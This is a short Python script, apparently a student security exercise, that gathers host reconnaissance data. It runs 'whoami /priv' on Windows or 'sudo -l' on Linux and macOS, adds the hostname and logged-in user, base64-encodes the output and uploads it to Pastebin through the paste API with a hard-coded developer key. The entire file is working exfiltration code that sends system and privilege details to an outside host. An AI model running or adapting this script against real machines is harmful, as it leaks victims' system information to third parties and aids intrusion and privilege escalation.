#Nama : Muhamad Faqih
#Nim : 2301887931
#Kelas : LB07

import requests, base64, subprocess, os, socket

from requests import api

def main():
    
    out = b''
    if os.name == "nt": #Untuk Windows

        s = subprocess.Popen("whoami /priv", stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        stdout, stderr = s.communicate()
        out += b'\n------------------------------------------\n' 
        out += b'\n*Hostname:* ' + socket.gethostname().encode() + b'\n\n\n*Logged in:* '+ os.getlogin().encode() + b'\n\n\n*Current Previleges:*\n'+ stdout
        out += b'\n------------------------------------------\n' 

        res = out.decode()
        encodeb64 = base64.b64encode(res.encode('utf-8'))
        print(encodeb64)
        pastebin_upload(encodeb64)
        
    else: #Untuk linux & Mac OS

        s = subprocess.Popen("sudo -l", stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        stdout, stderr = s.communicate()
        out += b'\n------------------------------------------\n' 
        out += b'\n*Hostname:* ' + socket.gethostname().encode() + b'\n\n\n*Logged in:* '+ os.getlogin().encode() + b'\n\n\n*Current Previleges:*\n'+ stdout
        out += b'\n------------------------------------------\n' 

        res = out.decode()
        encodeb64 = base64.b64encode(res.encode('utf-8'))
        print(encodeb64)
        pastebin_upload(encodeb64)

def pastebin_upload(res):
    url = "https://pastebin.com/api/api_post.php"

    req = requests.post(url, data={
        'api_dev_key' : "gGLryP9bbIcXo5IU2pWUrpavvAqKk5mq",
        'api_paste_code' : res,
        'api_paste_name' : "Hasil Host Reconnaissance",
        'api_option' : "paste"
    })
    print(req.text)

if __name__ == "__main__":
    main()